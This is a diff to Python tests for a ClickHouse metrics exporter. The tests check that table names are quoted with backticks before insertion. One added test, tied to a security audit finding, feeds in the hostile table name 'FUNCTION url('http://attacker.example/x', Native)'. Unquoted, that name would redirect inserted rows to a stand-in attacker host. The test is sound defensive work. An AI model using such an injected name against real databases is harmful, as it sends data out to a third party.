@@ -245,10 +245,10 @@ def test_clickhouse_creates_typed_tables_and_inserts_rows(backend):
     assert create and "`total` Nullable(Float64)" in create[0] and "`label` Nullable(String)" in create[0]
     assert "`time` DateTime" in create[0] and "`hostname_id` String" in create[0]
     scalar, collection = backend.writes
-    assert scalar["table"] == "fakescalar"
+    assert scalar["table"] == "`fakescalar`", "quoted, as the CREATE/ALTER statements are"
     assert scalar["columns"][:5] == ["time", "hostname_id", "total", "label", "missing"]
     assert scalar["rows"][0][1:5] == ["box", 12.5, "busy host", None]
-    assert collection["table"] == "fakecollection"
+    assert collection["table"] == "`fakecollection`"
     assert collection["columns"][:5] == ["time", "hostname_id", "key_id", "name", "rx"]
     assert [row[1:5] for row in collection["rows"]] == [["box", "name", "eth0", 10], ["box", "name", HOSTILE_NAME, 20]]
     exporter.exit()
@@ -276,6 +276,20 @@ def test_clickhouse_hostile_table_name_sends_no_sql(backend):
     assert backend.sql == [] and backend.writes == []
     exporter.export("my plugin", ["time", "hostname_id"], [[datetime.now(), "h"]])
     assert backend.sql[0].startswith("CREATE TABLE IF NOT EXISTS `my plugin` (")
+
+
+def test_clickhouse_insert_gets_the_quoted_table_name(backend):
+    """Security audit 2026-10-17, R-1: `insert(table=...)` is interpolated raw by the driver.
+
+    A name the allow-list admits (quotes, parentheses, spaces, dots) must reach
+    it quoted, like the CREATE/ALTER statements, or `INSERT INTO FUNCTION
+    url('http://attacker.example/x', Native)` is valid ClickHouse.
+    """
+    exporter = run("clickhouse")
+    backend.writes.clear()
+    name = "FUNCTION url('http://attacker.example/x', Native)"
+    exporter.export(name, ["time", "hostname_id"], [[datetime.now(), "h"]])
+    assert backend.writes[0]["table"] == "`FUNCTION url(\\'http://attacker.example/x\\', Native)`"
 
 
 def test_clickhouse_update_leaves_the_plugin_view_and_the_store_untouched(backend):
